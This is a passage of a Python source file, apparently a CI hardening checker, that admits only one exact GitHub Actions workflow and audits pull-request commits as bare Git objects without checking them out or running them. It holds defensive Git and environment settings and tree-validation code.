#!/usr/bin/env python3
"""Fail-closed admission for the repository's only executable workflow.

The authoritative mode reads an exact fetched commit from a bare Git object
database. Candidate paths and blobs are never checked out, imported, or
executed. The admitted workflow is strict JSON, a YAML 1.2 subset.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import time
import unicodedata
from dataclasses import dataclass
from pathlib import Path, PurePosixPath
from typing import Any


AUDITED_ACTION_PINS = {
    "actions/checkout": "11d5960a326750d5838078e36cf38b85af677262",
    "actions/download-artifact": "d3f86a106a0bac45b974a628896c90dbdf5c8093",
    "actions/setup-python": "a26af69be951a213d495a4c3e4e4022e16d87065",
    "actions/upload-artifact": "ea165f8d65b6e75b540449e92b4886f43607fa02",
    "al-cheb/configure-pagefile-action": "a3b6ebd6b634da88790d9c58d4b37a7f4a7b8708",
    "msys2/setup-msys2": "66cd2cce69caa17b53920067426061ca1de3a884",
}
CHECKOUT_PIN = (
    "actions/checkout@11d5960a326750d5838078e36cf38b85af677262"
)
EXPECTED_BRANCHES = ["master", "crutkas-arm64-ci-action-pins"]
EXPECTED_TYPES = ["opened", "synchronize", "reopened", "ready_for_review"]
EXPECTED_FETCH_REF = "refs/workflow-audit/pr-head"
EXPECTED_WORKFLOW_PATH = ".github/workflows/main.yml"
EXPECTED_CHECKER_PATH = ".ci/check-workflow-hardening.py"
HEX_OBJECT_ID = re.compile(r"^[0-9a-f]{40}$")
MAX_COMMIT_BYTES = 128 * 1024
MAX_PROTECTED_BLOB_BYTES = 256 * 1024
MAX_BLOB_BYTES = 16 * 1024 * 1024
MAX_TREE_BYTES = 2 * 1024 * 1024
MAX_TREE_LISTING_BYTES = 4 * 1024 * 1024
MAX_TREE_ENTRIES = 20_000
COMMAND_TIMEOUT_SECONDS = 30

FETCH_AND_AUDIT_RUN = r"""set -f
IFS=$'\n\t'
umask 077
fail() {
  printf '%s\n' "ERROR: $1" >&2
  exit 1
}
for required_name in AUDIT_REPOSITORY AUDIT_REPOSITORY_OWNER AUDIT_BASE_REPOSITORY AUDIT_HEAD_REPOSITORY AUDIT_BASE_REF AUDIT_BASE_SHA AUDIT_HEAD_SHA AUDIT_PR_NUMBER AUDIT_SERVER_URL AUDIT_WORKSPACE AUDIT_RUNNER_TEMP AUDIT_TRUSTED_ROOT AUDIT_RUN_ID AUDIT_RUN_ATTEMPT; do
  [[ -n "${!required_name-}" ]] || fail "required event or runner field is empty"
done
repository_pattern='^[A-Za-z0-9][A-Za-z0-9._-]{0,99}/[A-Za-z0-9][A-Za-z0-9._-]{0,99}$'
[[ "$AUDIT_REPOSITORY" =~ $repository_pattern ]] || fail "base repository identity is malformed"
[[ "$AUDIT_BASE_REPOSITORY" =~ $repository_pattern ]] || fail "event base repository identity is malformed"
[[ "$AUDIT_HEAD_REPOSITORY" =~ $repository_pattern ]] || fail "event head repository identity is malformed"
repository_owner="${AUDIT_REPOSITORY%%/*}"
repository_name="${AUDIT_REPOSITORY#*/}"
[[ "$repository_owner" == "$AUDIT_REPOSITORY_OWNER" ]] || fail "repository owner identity mismatch"
[[ "$AUDIT_BASE_REPOSITORY" == "$AUDIT_REPOSITORY" ]] || fail "pull request base repository identity mismatch"
[[ "$repository_owner" != "." && "$repository_owner" != ".." && "$repository_name" != "." && "$repository_name" != ".." ]] || fail "repository identity is ambiguous"
[[ "$repository_owner" != *..* && "$repository_name" != *..* ]] || fail "repository identity contains an ambiguous component"
case "$AUDIT_BASE_REF" in
  master|crutkas-arm64-ci-action-pins) ;;
  *) fail "pull request base ref is not protected by this policy" ;;
esac
[[ "$AUDIT_PR_NUMBER" =~ ^[1-9][0-9]*$ ]] || fail "pull request number is not canonical decimal"
[[ "$AUDIT_RUN_ID" =~ ^[1-9][0-9]*$ ]] || fail "run id is not canonical decimal"
[[ "$AUDIT_RUN_ATTEMPT" =~ ^[1-9][0-9]*$ ]] || fail "run attempt is not canonical decimal"
[[ "$AUDIT_BASE_SHA" =~ ^[0-9a-f]{40}$ ]] || fail "base SHA is not lowercase 40-hex"
[[ "$AUDIT_HEAD_SHA" =~ ^[0-9a-f]{40}$ ]] || fail "head SHA is not lowercase 40-hex"
[[ "$AUDIT_SERVER_URL" == "https://github.com" ]] || fail "GitHub HTTPS host is not admitted"
for required_tool in /usr/bin/env /usr/bin/git /usr/bin/python3 /usr/bin/realpath /usr/bin/mkdir /usr/bin/rm; do
  [[ -x "$required_tool" ]] || fail "required system Git/Python/coreutils capability is unavailable"
done
workspace_root="$(/usr/bin/realpath -e -- "$AUDIT_WORKSPACE")" || fail "workspace path cannot be canonicalized"
runner_temp="$(/usr/bin/realpath -e -- "$AUDIT_RUNNER_TEMP")" || fail "runner temp path cannot be canonicalized"
trusted_root="$(/usr/bin/realpath -e -- "$AUDIT_TRUSTED_ROOT")" || fail "trusted checkout path cannot be canonicalized"
[[ "$AUDIT_WORKSPACE" == "$workspace_root" && "$AUDIT_RUNNER_TEMP" == "$runner_temp" && "$AUDIT_TRUSTED_ROOT" == "$trusted_root" ]] || fail "runner paths are not canonical"
[[ "$workspace_root" == /* && "$runner_temp" == /* && "$runner_temp" != "/" ]] || fail "runner paths are not safe absolute paths"
[[ "$trusted_root" == "$workspace_root/trusted" ]] || fail "trusted checkout is not isolated at the admitted path"
[[ "$runner_temp" != "$workspace_root" && "$runner_temp" != "$workspace_root/"* ]] || fail "candidate object database would be inside the workspace"
trusted_checker="$trusted_root/.ci/check-workflow-hardening.py"
[[ -f "$trusted_checker" && ! -L "$trusted_checker" ]] || fail "trusted checker is not a regular non-symlink file"
remote_url="${AUDIT_SERVER_URL}/${AUDIT_REPOSITORY}.git"
[[ "$remote_url" =~ ^https://github\.com/[A-Za-z0-9][A-Za-z0-9._-]{0,99}/[A-Za-z0-9][A-Za-z0-9._-]{0,99}\.git$ ]] || fail "fetch remote is not an admitted HTTPS repository URL"
[[ "$remote_url" == "https://github.com/${AUDIT_BASE_REPOSITORY}.git" ]] || fail "fetch remote does not identify the exact base repository"
git_environment=(
  /usr/bin/env -i
  PATH=/usr/bin:/bin
  HOME=/nonexistent
  XDG_CONFIG_HOME=/nonexistent
  LC_ALL=C
  GIT_CONFIG_NOSYSTEM=1
  GIT_CONFIG_SYSTEM=/dev/null
  GIT_CONFIG_GLOBAL=/dev/null
  GIT_CONFIG=/dev/null
  GIT_ATTR_NOSYSTEM=1
  GIT_TERMINAL_PROMPT=0
  GCM_INTERACTIVE=never
  GIT_ASKPASS=/bin/false
  SSH_ASKPASS=/bin/false
  GIT_NO_REPLACE_OBJECTS=1
  GIT_OPTIONAL_LOCKS=0
  GIT_LITERAL_PATHSPECS=1
  GIT_NOGLOB_PATHSPECS=1
  GIT_PROTOCOL_FROM_USER=0
  GIT_ALLOW_PROTOCOL=https
  GIT_LFS_SKIP_SMUDGE=1
)
git_command=(
  /usr/bin/git
  --no-pager
  --no-replace-objects
  -c credential.helper=
  -c credential.interactive=never
  -c core.askPass=/bin/false
  -c core.hooksPath=/dev/null
  -c core.fsmonitor=false
  -c core.useReplaceRefs=false
  -c extensions.worktreeConfig=false
  -c protocol.allow=never
  -c protocol.https.allow=always
  -c protocol.file.allow=never
  -c protocol.ext.allow=never
  -c protocol.ssh.allow=never
  -c http.proxy=
  -c https.proxy=
  -c http.extraHeader=
  -c remote.origin.proxy=
  -c transfer.fsckObjects=true
  -c fetch.fsckObjects=true
  -c receive.fsckObjects=true
  -c fetch.writeCommitGraph=false
  -c core.commitGraph=false
  -c gc.auto=0
  -c maintenance.auto=false
  -c submodule.recurse=false
  -c fetch.recurseSubmodules=false
  -c core.sparseCheckout=false
  -c core.sparseCheckoutCone=false
  -c filter.lfs.required=false
  -c filter.lfs.process=
  -c filter.lfs.smudge=
  -c filter.lfs.clean=
)
trusted_commit="$("${git_environment[@]}" "${git_command[@]}" -C "$trusted_root" rev-parse --verify 'HEAD^{commit}')" || fail "trusted checkout commit cannot be resolved"
[[ "$trusted_commit" == "$AUDIT_BASE_SHA" ]] || fail "trusted checkout does not equal the exact event base SHA"
candidate_git_dir="$runner_temp/workflow-audit-${AUDIT_RUN_ID}-${AUDIT_RUN_ATTEMPT}.git"
[[ "$candidate_git_dir" == "$runner_temp/"* && "$candidate_git_dir" != "$runner_temp/" && ! -e "$candidate_git_dir" && ! -L "$candidate_git_dir" ]] || fail "candidate object database path is not fresh and owned"
owned_candidate=0
cleanup_candidate() {
  cleanup_status=$?
  trap - EXIT
  if [[ "$owned_candidate" == 1 ]]; then
    cleanup_path="$(/usr/bin/realpath -e -- "$candidate_git_dir" 2>/dev/null || true)"
    if [[ "$cleanup_path" != "$candidate_git_dir" ]]; then
      printf '%s\n' "ERROR: refusing to clean a changed candidate object path" >&2
      [[ "$cleanup_status" != 0 ]] || cleanup_status=1
    elif ! /usr/bin/rm -rf -- "$candidate_git_dir"; then
      printf '%s\n' "ERROR: failed to clean the owned candidate object database" >&2
      [[ "$cleanup_status" != 0 ]] || cleanup_status=1
    fi
  fi
  exit "$cleanup_status"
}
trap cleanup_candidate EXIT
/usr/bin/mkdir --mode=0700 -- "$candidate_git_dir" || fail "candidate object database directory cannot be created"
owned_candidate=1
[[ "$(/usr/bin/realpath -e -- "$candidate_git_dir")" == "$candidate_git_dir" ]] || fail "candidate object database path changed after creation"
"${git_environment[@]}" "${git_command[@]}" init --quiet --bare --object-format=sha1 --template=/dev/null -- "$candidate_git_dir" || fail "bare candidate object database initialization failed"
pull_refspec="+refs/pull/${AUDIT_PR_NUMBER}/head:refs/workflow-audit/pr-head"
"${git_environment[@]}" "${git_command[@]}" --git-dir="$candidate_git_dir" fetch --quiet --force --no-tags --no-recurse-submodules --no-write-fetch-head --no-auto-maintenance --depth=1 -- "$remote_url" "$pull_refspec" || fail "exact base-repository pull ref fetch failed"
/usr/bin/python3 -I -B "$trusted_checker" --self-test
/usr/bin/python3 -I -B "$trusted_checker" --git-dir "$candidate_git_dir" --commit "$AUDIT_HEAD_SHA"
"""


class DuplicateKeyError(ValueError):
    pass


class GitAuditError(RuntimeError):
    pass


@dataclass(frozen=True)
class GitResult:
    returncode: int
    stdout: bytes
    stderr: bytes


@dataclass(frozen=True)
class TreeEntry:
    mode: str
    kind: str
    oid: str
    declared_size: int | None
    path: str
    path_bytes: bytes


@dataclass(frozen=True)
class ObjectInfo:
    kind: str
    size: int


@dataclass(frozen=True)
class FixtureLeaf:
    mode: str = "100644"
    kind: str = "blob"
    content: bytes | None = b"fixture\n"
    oid: str | None = None


def strict_object(pairs: list[tuple[str, Any]]) -> dict[str, Any]:
    result: dict[str, Any] = {}
    for key, value in pairs:
        if key in result:
            raise DuplicateKeyError(f"duplicate mapping key {key!r}")
        result[key] = value
    return result


def trusted_checkout_inputs() -> dict[str, Any]:
    return {
        "repository": "${{ github.repository }}",
        "ref": "${{ github.event.pull_request.base.sha }}",
        "path": "trusted",
        "persist-credentials": False,
        "fetch-depth": 1,
        "lfs": False,
        "submodules": False,
        "clean": True,
        "set-safe-directory": False,
        "show-progress": False,
    }


def audit_environment() -> dict[str, str]:
    return {
        "AUDIT_REPOSITORY": "${{ github.repository }}",
        "AUDIT_REPOSITORY_OWNER": "${{ github.repository_owner }}",
        "AUDIT_BASE_REPOSITORY": (
            "${{ github.event.pull_request.base.repo.full_name }}"
        ),
        "AUDIT_HEAD_REPOSITORY": (
            "${{ github.event.pull_request.head.repo.full_name }}"
        ),
        "AUDIT_BASE_REF": "${{ github.event.pull_request.base.ref }}",
        "AUDIT_BASE_SHA": "${{ github.event.pull_request.base.sha }}",
        "AUDIT_HEAD_SHA": "${{ github.event.pull_request.head.sha }}",
        "AUDIT_PR_NUMBER": "${{ github.event.pull_request.number }}",
        "AUDIT_SERVER_URL": "${{ github.server_url }}",
        "AUDIT_WORKSPACE": "${{ github.workspace }}",
        "AUDIT_RUNNER_TEMP": "${{ runner.temp }}",
        "AUDIT_TRUSTED_ROOT": "${{ github.workspace }}/trusted",
        "AUDIT_RUN_ID": "${{ github.run_id }}",
        "AUDIT_RUN_ATTEMPT": "${{ github.run_attempt }}",
        "BASH_ENV": "/dev/null",
        "ENV": "/dev/null",
        "CDPATH": "",
        "LD_PRELOAD": "",
        "LD_LIBRARY_PATH": "",
    }


def admitted_workflow() -> dict[str, Any]:
    return {
        "name": "trusted-base-workflow-source-audit",
        "on": {
            "pull_request_target": {
                "branches": EXPECTED_BRANCHES,
                "types": EXPECTED_TYPES,
            }
        },
        "permissions": {},
        "concurrency": {
            "group": (
                "trusted-base-workflow-source-audit-"
                "${{ github.event.pull_request.number }}-"
                "${{ github.event.pull_request.head.sha }}"
            ),
            "cancel-in-progress": True,
        },
        "jobs": {
            "offline-source-audit": {
                "name": (
                    "Trusted-base source audit "
                    "(candidate exists only as bare Git objects)"
                ),
                "runs-on": "ubuntu-24.04",
                "permissions": {"contents": "read"},
                "timeout-minutes": 5,
                "steps": [
                    {
                        "name": "Checkout exact trusted base without credentials",
                        "uses": CHECKOUT_PIN,
                        "with": trusted_checkout_inputs(),
                    },
                    {
                        "name": "Fetch and parse exact candidate as bare objects",
                        "shell": (
                            "bash --noprofile --norc -euo pipefail {0}"
                        ),
                        "env": audit_environment(),
                        "run": FETCH_AND_AUDIT_RUN,
                    },
                ],
            }
        },
    }


def expected_workflow_bytes() -> bytes:
    return (
        json.dumps(admitted_workflow(), indent=2, ensure_ascii=True) + "\n"
    ).encode("utf-8")


def diagnostic_worktree_bytes(content: bytes) -> bytes:
    return content.replace(b"\r\n", b"\n")


def display(value: Any) -> str:
    rendered = repr(value)
    return rendered if len(rendered) <= 160 else rendered[:157] + "..."


def semantic_differences(
    actual: Any, expected: Any, path: str = "$"
) -> list[str]:
    if type(actual) is not type(expected):
        return [
            f"{path}: expected {type(expected).__name__}, "
            f"found {type(actual).__name__}"
        ]
    if isinstance(expected, dict):
        findings: list[str] = []
        for key in sorted(expected.keys() - actual.keys()):
            findings.append(f"{path}: missing key {key!r}")
        for key in sorted(actual.keys() - expected.keys()):
            findings.append(f"{path}: unexpected key {key!r}")
        for key in sorted(expected.keys() & actual.keys()):
            findings.extend(
                semantic_differences(actual[key], expected[key], f"{path}.{key}")
            )
        return findings
    if isinstance(expected, list):
        findings = []
        if len(actual) != len(expected):
            findings.append(
                f"{path}: expected {len(expected)} item(s), found {len(actual)}"
            )
        for index, (actual_item, expected_item) in enumerate(
            zip(actual, expected)
        ):
            findings.extend(
                semantic_differences(
                    actual_item, expected_item, f"{path}[{index}]"
                )
            )
        return findings
    if actual != expected:
        return [
            f"{path}: expected {display(expected)}, found {display(actual)}"
        ]
    return []


def parse_workflow_bytes(
    content: bytes, label: str, findings: list[str]
) -> dict[str, Any] | None:
    if len(content) > MAX_PROTECTED_BLOB_BYTES:
        findings.append(
            f"{label}: source exceeds the "
            f"{MAX_PROTECTED_BLOB_BYTES}-byte protected-file limit"
        )
        return None
    try:
        text = content.decode("utf-8")
        document = json.loads(text, object_pairs_hook=strict_object)
    except (
        UnicodeError,
        json.JSONDecodeError,
        DuplicateKeyError,
    ) as error:
        findings.append(
            f"{label}: must be one strict-JSON YAML 1.2 mapping: {error}"
        )
        return None
    if not isinstance(document, dict):
        findings.append(f"{label}: workflow root must be a mapping")
        return None
    return document


def _git_executable() -> str:
    if os.name == "posix":
        candidate = Path("/usr/bin/git")
        if candidate.is_file() and os.access(candidate, os.X_OK):
            return str(candidate)
        raise GitAuditError("required system Git is unavailable at /usr/bin/git")
    candidate = shutil.which("git")
    if candidate is None:
        raise GitAuditError("required system Git is unavailable")
    return str(Path(candidate).resolve(strict=True))


def _git_environment(git_executable: str) -> dict[str, str]:
    if os.name == "nt":
        path_parts = [
            str(Path(git_executable).parent),
            os.environ.get("SystemRoot", r"C:\Windows") + r"\System32",
        ]
        environment = {
            key: os.environ[key]
            for key in ("SystemRoot", "WINDIR", "COMSPEC", "PATHEXT", "TEMP", "TMP")
            if key in os.environ
        }
        environment["PATH"] = os.pathsep.join(path_parts)
    else:
        environment = {"PATH": "/usr/bin:/bin", "HOME": "/nonexistent"}
    environment.update(
        {
            "LC_ALL": "C",
            "GIT_CONFIG_NOSYSTEM": "1",
            "GIT_CONFIG_SYSTEM": os.devnull,
            "GIT_CONFIG_GLOBAL": os.devnull,
            "GIT_CONFIG": os.devnull,
            "GIT_ATTR_NOSYSTEM": "1",
            "GIT_TERMINAL_PROMPT": "0",
            "GCM_INTERACTIVE": "never",
            "GIT_ASKPASS": os.devnull,
            "SSH_ASKPASS": os.devnull,
            "GIT_NO_REPLACE_OBJECTS": "1",
            "GIT_OPTIONAL_LOCKS": "0",
            "GIT_LITERAL_PATHSPECS": "1",
            "GIT_NOGLOB_PATHSPECS": "1",
            "GIT_PROTOCOL_FROM_USER": "0",
            "GIT_ALLOW_PROTOCOL": "https",
            "GIT_LFS_SKIP_SMUDGE": "1",
        }
    )
    return environment


def _git_command(
    git_executable: str, git_dir: Path | None, arguments: list[str]
) -> list[str]:
    command = [
        git_executable,
        "--no-pager",
        "--no-replace-objects",
        "-c",
        f"core.hooksPath={os.devnull}",
        "-c",
        "core.fsmonitor=false",
        "-c",
        "core.useReplaceRefs=false",
        "-c",
        "extensions.worktreeConfig=false",
        "-c",
        "protocol.allow=never",
        "-c",
        "protocol.file.allow=never",
        "-c",
        "protocol.ext.allow=never",
        "-c",
        "protocol.ssh.allow=never",
        "-c",
        "filter.lfs.required=false",
        "-c",
        "filter.lfs.process=",
        "-c",
        "filter.lfs.smudge=",
        "-c",
        "filter.lfs.clean=",
        "-c",
        "gc.auto=0",
        "-c",
        "maintenance.auto=false",
    ]
    if git_dir is not None:
        command.append(f"--git-dir={git_dir}")
    command.extend(arguments)
    return command


def run_git(
    arguments: list[str],
    *,
    git_dir: Path | None = None,
    input_data: bytes | None = None,
    max_stdout: int = 256 * 1024,
    check: bool = True,
) -> GitResult:
    git_executable = _git_executable()
    command = _git_command(git_executable, git_dir, arguments)
    started = time.monotonic()
    with (
        tempfile.TemporaryFile() as stdin_file,
        tempfile.TemporaryFile() as stdout_file,
        tempfile.TemporaryFile() as stderr_file,
    ):
        if input_data is not None:
            stdin_file.write(input_data)
        stdin_file.seek(0)
        process = subprocess.Popen(
            command,
            stdin=stdin_file,
            stdout=stdout_file,
            stderr=stderr_file,
            env=_git_environment(git_executable),
            close_fds=True,
        )
        exceeded = False
        timed_out = False
        while process.poll() is None:
            if os.fstat(stdout_file.fileno()).st_size > max_stdout:
                exceeded = True
                process.kill()
                break
            if os.fstat(stderr_file.fileno()).st_size > 128 * 1024:
                exceeded = True
                process.kill()
                break
            if time.monotonic() - started > COMMAND_TIMEOUT_SECONDS:
                timed_out = True
                process.kill()
                break
            time.sleep(0.01)
        process.wait()
        stdout_file.seek(0)
        stderr_file.seek(0)
        stdout = stdout_file.read(max_stdout + 1)
        stderr = stderr_file.read(128 * 1024 + 1)

    if timed_out:
        raise GitAuditError("Git command exceeded the fixed time limit")
    if exceeded or len(stdout) > max_stdout or len(stderr) > 128 * 1024:
        raise GitAuditError("Git command exceeded its bounded output limit")
    result = GitResult(process.returncode, stdout, stderr)
    if check and result.returncode != 0:
        detail = result.stderr.decode("utf-8", "replace").strip()
        if len(detail) > 500:
            detail = detail[:497] + "..."
        raise GitAuditError(
            f"Git command failed with exit {result.returncode}"
            + (f": {detail}" if detail else "")
        )
    return result


def validate_git_dir(git_dir: Path, findings: list[str]) -> Path | None:
    if not git_dir.is_absolute():
        findings.append("bare git-dir: path must be absolute")
        return None
    try:
        resolved = git_dir.resolve(strict=True)
    except OSError as error:
        findings.append(f"bare git-dir: cannot resolve path: {error}")
        return None
    if os.path.normcase(str(git_dir)) != os.path.normcase(str(resolved)):
        findings.append("bare git-dir: symlinked or non-canonical path is not admitted")
        return None
    if not resolved.is_dir() or resolved.is_symlink():
        findings.append("bare git-dir: required regular directory is missing")
        return None
    for relative in ("objects", "refs"):
        child = resolved / relative
        if not child.is_dir() or child.is_symlink():
            findings.append(
                f"bare git-dir: {relative} must be a non-symlink directory"
            )
    forbidden_metadata = (
        "config.worktree",
        "index",
        "commondir",
        "modules",
        "worktrees",
        "lfs",
        "objects/info/alternates",
        "objects/info/http-alternates",
    )
    for relative in forbidden_metadata:
        if (resolved / relative).exists() or (resolved / relative).is_symlink():
            findings.append(
                f"bare git-dir: candidate-controlled {relative} is not admitted"
            )
    hooks = resolved / "hooks"
    if hooks.exists():
        if hooks.is_symlink() or not hooks.is_dir():
            findings.append("bare git-dir: hooks must not redirect execution")
        else:
            try:
                if any(hooks.iterdir()):
                    findings.append("bare git-dir: hook files are not admitted")
            except OSError as error:
                findings.append(f"bare git-dir: cannot inspect hooks: {error}")
    return resolved if not findings else None


def parse_refs(git_dir: Path, findings: list[str]) -> dict[str, str]:
    result = run_git(["show-ref"], git_dir=git_dir, check=False)
    if result.returncode not in (0, 1):
        raise GitAuditError(
            f"cannot enumerate fetched refs (exit {result.returncode})"
        )
    refs: dict[str, str] = {}
    for raw_line in result.stdout.splitlines():
        fields = raw_line.split(b" ")
        if len(fields) != 2:
            findings.append("fetch: malformed ref enumeration")
            continue
        try:
            oid = fields[0].decode("ascii")
            ref = fields[1].decode("ascii")
        except UnicodeError:
            findings.append("fetch: non-ASCII ref enumeration")
            continue
        if not HEX_OBJECT_ID.fullmatch(oid):
            findings.append("fetch: ref resolved to a malformed object id")
            continue
        if ref in refs:
            findings.append(f"fetch: duplicate ref {ref!r}")
            continue
        refs[ref] = oid
    return refs


def object_info(
    git_dir: Path, object_ids: set[str], findings: list[str]
) -> dict[str, ObjectInfo]:
    if not object_ids:
        return {}
    ordered = sorted(object_ids)
    for oid in ordered:
        if not HEX_OBJECT_ID.fullmatch(oid):
            findings.append("objects: malformed object id from Git")
            return {}
    result = run_git(
        ["cat-file", "--batch-check=%(objectname) %(objecttype) %(objectsize)"],
        git_dir=git_dir,
        input_data=("".join(f"{oid}\n" for oid in ordered)).encode("ascii"),
        max_stdout=len(ordered) * 100 + 1024,
    )
    lines = result.stdout.splitlines()
    if len(lines) != len(ordered):
        findings.append("objects: batch response count mismatch")
        return {}
    objects: dict[str, ObjectInfo] = {}
    for requested, raw_line in zip(ordered, lines):
        fields = raw_line.split(b" ")
        if len(fields) == 2 and fields[1] == b"missing":
            findings.append(f"objects: required object {requested} is missing")
            continue
        if len(fields) != 3:
            findings.append("objects: malformed batch response")
            continue
        try:
            returned = fields[0].decode("ascii")
            kind = fields[1].decode("ascii")
            size_text = fields[2].decode("ascii")
        except UnicodeError:
            findings.append("objects: non-ASCII batch response")
            continue
        if returned != requested or not size_text.isdecimal():
            findings.append("objects: ambiguous batch response")
            continue
        objects[requested] = ObjectInfo(kind, int(size_text))
    return objects


def read_object(
    git_dir: Path, kind: str, oid: str, maximum: int
) -> bytes:
    result = run_git(
        ["cat-file", kind, oid],
        git_dir=git_dir,
        max_stdout=maximum,
    )
    return result.stdout


def parse_commit(
    git_dir: Path, commit: str, findings: list[str]
) -> str | None:
    information = object_info(git_dir, {commit}, findings)
    info = information.get(commit)
    if info is None:
        return None
    if info.kind != "commit":
        findings.append(f"commit: expected commit object, found {info.kind!r}")
        return None
    if info.size > MAX_COMMIT_BYTES:
        findings.append(
            f"commit: object exceeds the {MAX_COMMIT_BYTES}-byte limit"
        )
        return None
    raw = read_object(git_dir, "commit", commit, MAX_COMMIT_BYTES)
    if b"\0" in raw:
        findings.append("commit: NUL bytes are not admitted")
        return None
    try:
        text = raw.decode("utf-8")
    except UnicodeError as error:
        findings.append(f"commit: non-UTF-8 content is not admitted: {error}")
        return None
    headers, separator, _message = text.partition("\n\n")
    if not separator:
        findings.append("commit: missing header/message separator")
        return None
    tree_values: list[str] = []
    parents: list[str] = []
    author_count = 0
    committer_count = 0
    continuing = False
    for line in headers.splitlines():
        if line.startswith(" "):
            if not continuing:
                findings.append("commit: orphaned continuation header")
            continue
        continuing = False
        key, separator, value = line.partition(" ")
        if not separator or not value:
            findings.append("commit: malformed header")
            continue
        if key == "tree":
            tree_values.append(value)
        elif key == "parent":
            parents.append(value)
        elif key == "author":
            author_count += 1
        elif key == "committer":
            committer_count += 1
        elif key in ("gpgsig", "mergetag"):
            continuing = True
        elif key == "encoding":
            if value.lower() not in ("utf-8", "utf8"):
                findings.append("commit: only UTF-8 encoding is admitted")
        else:
            findings.append(f"commit: unexpected header {key!r}")
    if len(tree_values) != 1 or not HEX_OBJECT_ID.fullmatch(tree_values[0]):
        findings.append("commit: requires exactly one lowercase 40-hex tree")
    if len(parents) > 2:
        findings.append("commit: more than two parents are not admitted")
    if any(not HEX_OBJECT_ID.fullmatch(parent) for parent in parents):
        findings.append("commit: parent object id is malformed")
    if author_count != 1 or committer_count != 1:
        findings.append("commit: requires exactly one author and committer")
    return tree_values[0] if len(tree_values) == 1 else None


def workflow_policy_path(path: str) -> bool:
    canonical = unicodedata.normalize("NFC", path).casefold()
    namespace = ".github/workflows"
    return canonical == namespace or canonical.startswith(namespace + "/")


def finding_prefix(path: str) -> str:
    return "workflow tree" if workflow_policy_path(path) else "tree"


def parse_tree_listing(
    raw: bytes, findings: list[str]
) -> list[TreeEntry]:
    if raw and not raw.endswith(b"\0"):
        findings.append("tree: NUL-delimited listing is truncated")
        return []
    records = raw.split(b"\0")
    if records and records[-1] == b"":
        records.pop()
    if len(records) > MAX_TREE_ENTRIES:
        findings.append(
            f"tree: more than {MAX_TREE_ENTRIES} recursive entries are not admitted"
        )
        return []
    entries: list[TreeEntry] = []
    seen_bytes: set[bytes] = set()
    canonical_paths: dict[str, str] = {}
    for record in records:
        metadata, separator, path_bytes = record.partition(b"\t")
        fields = metadata.split()
        if not separator or len(fields) != 4 or not path_bytes:
            findings.append("tree: malformed ls-tree record")
            continue
        try:
            mode = fields[0].decode("ascii")
            kind = fields[1].decode("ascii")
            oid = fields[2].decode("ascii")
            size_text = fields[3].decode("ascii")
        except UnicodeError:
            findings.append("tree: non-ASCII object metadata")
            continue
        try:
            path = path_bytes.decode("utf-8")
        except UnicodeError:
            findings.append(
                "tree: non-UTF-8 path is not admitted "
                f"({path_bytes[:32].hex()})"
            )
            continue
        prefix = finding_prefix(path)
        if path_bytes in seen_bytes:
            findings.append(f"{prefix}: duplicate raw path {path!r}")
        seen_bytes.add(path_bytes)
        if (
            path.startswith("/")
            or "\\" in path
            or any(ord(character) < 32 or ord(character) == 127 for character in path)
        ):
            findings.append(f"{prefix}: ambiguous path {path!r} is not admitted")
        parts = PurePosixPath(path).parts
        if (
            not parts
            or any(part in ("", ".", "..") for part in parts)
            or any(part.endswith((" ", ".")) for part in parts)
        ):
            findings.append(f"{prefix}: ambiguous path {path!r} is not admitted")
        normalized = unicodedata.normalize("NFC", path)
        if normalized != path:
            findings.append(f"{prefix}: path {path!r} is not NFC")
        canonical = normalized.casefold()
        previous = canonical_paths.get(canonical)
        if previous is not None and previous != path:
            alias_prefix = (
                "workflow tree"
                if workflow_policy_path(previous) or workflow_policy_path(path)
                else "tree"
            )
            findings.append(
                f"{alias_prefix}: canonical path alias collision "
                f"between {previous!r} and {path!r}"
            )
        else:
            canonical_paths[canonical] = path
        if not HEX_OBJECT_ID.fullmatch(oid):
            findings.append(f"{prefix}: malformed object id for {path!r}")
            continue
        declared_size: int | None
        if size_text in ("-", "BAD"):
            declared_size = None
        elif size_text.isdecimal():
            declared_size = int(size_text)
        else:
            findings.append(f"{prefix}: malformed size for {path!r}")
            continue
        if kind == "tree":
            if mode != "040000" or declared_size is not None:
                findings.append(
                    f"{prefix}: unexpected mode/type for {path!r}: "
                    f"{mode}/{kind}"
                )
        elif kind == "blob":
            if mode not in ("100644", "100755"):
                findings.append(
                    f"{prefix}: unexpected mode/type for {path!r}: "
                    f"{mode}/{kind}"
                )
        else:
            findings.append(
                f"{prefix}: non-blob/tree entry for {path!r}: {mode}/{kind}"
            )
        entries.append(
            TreeEntry(mode, kind, oid, declared_size, path, path_bytes)
        )
    return entries


def validate_tree_objects(
    git_dir: Path,
    root_tree: str,
    entries: list[TreeEntry],
    findings: list[str],
) -> dict[str, ObjectInfo]:
    object_ids = {root_tree}
    object_ids.update(entry.oid for entry in entries)
    information = object_info(git_dir, object_ids, findings)
    root_info = information.get(root_tree)
    if root_info is not None:
        if root_info.kind != "tree":
            findings.append("tree: commit root is not a tree object")
        elif root_info.size > MAX_TREE_BYTES:
            findings.append(
                f"tree: root object exceeds the {MAX_TREE_BYTES}-byte limit"
            )
    for entry in entries:
        info = information.get(entry.oid)
        if info is None:
            continue
        prefix = finding_prefix(entry.path)
        if info.kind != entry.kind:
            findings.append(
                f"{prefix}: declared/actual type mismatch for {entry.path!r}"
            )
            continue
        if entry.declared_size is not None and entry.declared_size != info.size:
            findings.append(
                f"{prefix}: declared/actual size mismatch for {entry.path!r}"
            )
        if info.kind == "blob" and info.size > MAX_BLOB_BYTES:
            findings.append(
                f"{prefix}: blob {entry.path!r} exceeds the "
                f"{MAX_BLOB_BYTES}-byte limit"
            )
        if info.kind == "tree" and info.size > MAX_TREE_BYTES:
            findings.append(
                f"{prefix}: tree {entry.path!r} exceeds the "
                f"{MAX_TREE_BYTES}-byte limit"
            )
    return information


def validate_workflow_namespace(
    entries: list[TreeEntry], findings: list[str]
) -> dict[str, TreeEntry]:
    expected = {
        ".github/workflows": ("040000", "tree"),
        EXPECTED_WORKFLOW_PATH: ("100644", "blob"),
    }
    admitted: dict[str, TreeEntry] = {}
    for entry in entries:
        if not workflow_policy_path(entry.path):
            continue
        required = expected.get(entry.path)
        if required is None:
            findings.append(
                f"workflow tree: unexpected Git entry {entry.path!r}"
            )
            continue
        if (entry.mode, entry.kind) != required:
            findings.append(
                f"workflow tree: {entry.path!r} must be "
                f"{required[0]} {required[1]}, found "
                f"{entry.mode} {entry.kind}"
            )
            continue
        admitted[entry.path] = entry
